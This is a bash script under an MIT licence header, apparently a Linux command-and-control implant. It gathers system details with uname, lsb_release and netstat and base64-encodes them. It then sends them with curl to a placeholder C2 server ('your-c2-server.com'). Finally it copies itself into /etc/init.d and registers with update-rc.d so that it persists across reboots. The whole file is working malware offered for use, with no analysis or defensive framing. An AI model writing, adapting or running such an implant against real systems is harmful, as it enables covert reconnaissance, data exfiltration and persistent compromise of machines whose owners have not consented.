######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

#!/bin/bash

C2Server="https://your-c2-server.com"
AgentID=fd6001e9-5bc0-4d84-bfb9-dc5e960e2a80

encrypt_data() {
    local data="$1"
    echo "$data" | base64
}

decrypt_data() {
    local data="$1"
    echo "$data" | base64 --decode
}

write_log() {
    local message="$1"
    echo "$message"
}

send_data() {
    local endpoint="$1"
    local data="$2"
    local encrypted_data
    encrypted_data=$(encrypt_data "$data")
    curl -k -X POST "$C2Server/$endpoint" -d "$encrypted_data" -H "Content-Type: application/json"
}

gather_system_info() {
    uname -a > /tmp/sysinfo.txt
    lsb_release -a >> /tmp/sysinfo.txt
    cat /tmp/sysinfo.txt
}

list_network_connections() {
    netstat -an > /tmp/netstat.txt
    cat /tmp/netstat.txt
}

establish_persistence() {
    local script_path="/etc/init.d/linux_payload.sh"
    cp "$0" "$script_path"
    chmod +x "$script_path"
    update-rc.d linux_payload.sh defaults
}

main() {
    write_log "Payload started. ID: $AgentID"
    
    system_info=$(gather_system_info)
    network_connections=$(list_network_connections)
    
    data=$(cat <<EOF
{
    "AgentID": "$AgentID",
    "SystemInfo": "$system_info",
    "NetworkConnections": "$network_connections"
}
EOF
)
    
    send_data "report" "$data"
    establish_persistence
}

main
